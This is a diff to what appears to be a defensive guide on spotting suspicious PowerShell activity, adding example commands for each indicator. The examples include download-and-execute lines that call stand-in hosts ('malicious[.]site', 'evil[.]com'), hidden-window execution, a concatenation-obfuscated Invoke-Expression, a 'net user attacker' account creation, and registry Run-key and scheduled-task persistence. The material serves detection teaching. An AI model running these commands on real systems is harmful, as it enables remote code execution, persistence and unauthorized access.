@@ -252,13 +252,52 @@ PowerShell is a powerful scripting language and command-line shell used extensiv
 Indicators of suspicious PowerShell activity  
 
 **• Encoded commands:** Attackers may use the -EncodedCommand parameter to obfuscate their scripts, making it harder to detect malicious intent.<br/> 
+```
+powershell.exe -EncodedCommand SQBFAFgAIAByAGUAbQAuAGkAbgBpAHQAKAApAA==
+```
 **• External script downloads:** Scripts that download and execute external executables from malicious URLs are a common. **Invoke-WebRequest** or **Invoke-Expression** used with URLs.<br/>
+```
+IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]site/payload.ps1')
+```
+```
+Invoke-WebRequest -Uri "http://evil[.]com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
+Start-Process "C:\Users\Public\malware.exe"
+```
 **• Hidden windows:** Scripts that use **-WindowStyle Hidden** or **Start-Process** with hidden window options can indicate attempts to avoid detection.<br/>
+```
+Start-Process "cmd.exe" -WindowStyle Hidden -ArgumentList "/c whoami"
+```
+```
+powershell.exe -WindowStyle Hidden -Command "Invoke-Something"
+```
 **• String manipulation and concatenation:** Malicious scripts often break down commands into strings and use concatenation to evade detection by static analysis tools.<br/>
+```
+$cmd = "Invo" + "ke-Expression"
+$payload = "calc.exe"
+&$cmd $payload
+```
 **• External command execution:** PowerShell scripts that call external command-line utilities (e.g., cmd.exe, net.exe) can signify attempts to leverage system utilities for malicious purposes.<br/>
+```
+Start-Process "cmd.exe" -ArgumentList "/c net user attacker P@ssw0rd /add"
+```
+```
+Invoke-Expression "cmd /c whoami"
+```
 **• Registry interrogation:** Monitoring registry queries and modifications can reveal attempts to establish persistence or gather system information.<br/>
+```
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+```
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\malware.exe"
+```
 **• Unusual scheduled tasks:** Creation of unusual or suspicious scheduled tasks can indicate persistence attempts. Check task properties and the last run time for anomalies.<br/>
+```
+schtasks /create /tn "Updater" /tr "powershell.exe -File C:\malicious.ps1" /sc minute /mo 5
+```
 **• Log analysis:** Use **Get-WinEvent** to review unusual log entries, especially those related to PowerShell script block logging (Event ID 4104) and pipeline execution (Event ID 4103).<br/>
+```
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 }
+```
 
 Sysinternals Tools for process and system analysis<br/>
 **Process Explorer:** Provides detailed information about running processes, including open handles and loaded DLLs. Useful for identifying suspicious processes.<br/>
